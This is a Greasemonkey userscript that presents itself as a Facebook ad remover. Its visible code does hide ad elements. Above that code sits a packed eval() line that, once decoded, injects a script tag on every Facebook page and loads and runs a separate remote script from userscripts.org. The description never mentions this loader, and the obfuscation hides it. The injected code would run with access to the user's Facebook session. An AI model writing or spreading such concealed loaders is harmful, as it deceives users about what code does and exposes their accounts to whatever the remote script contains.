// ==UserScript==
// @name		NoFacebookAds Plus
// @namespace	        http://userscripts.org/scripts/show/13650
// @description	        Remove Facebook Flyer and other adverts
// @include		http://*facebook.com*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @exclude
// @version		0.5.4
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


var allAds, thisAd;
var logging = true;
allAds = document.evaluate("//div[contains(@id, 'sponsor')] | //div[contains(@id, 'ads')] | //div[contains(@class, 'ads')] | //div[@id='announce'] | //div[contains(@class, 'social_ad')]  | //div[contains(@id, 'sidebar_ads')] | //div[contains(@class, 'profile_sidebar_ads')] | //div[contains(@class, 'adcolumn')] | //div[@class='adcolumn'] | //div[contains(@class, 'adcolumn_header')] | //div[contains(@class, 'bumper')] | //div[@class='adcolumn_header'] //div[contains(@id, 'adcolumn_advertise')] | //div[contains(@id, 'pagelet_adbox')]",
 				    document, 
				    null, 
				    XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, 
				    null);
                    
for(var i=0; i < allAds.snapshotLength; i++ ){
	thisAd = allAds.snapshotItem(i);
	thisAd.style.display = "none";
	thisAd.parentNode.removeChild(thisAd);	
}



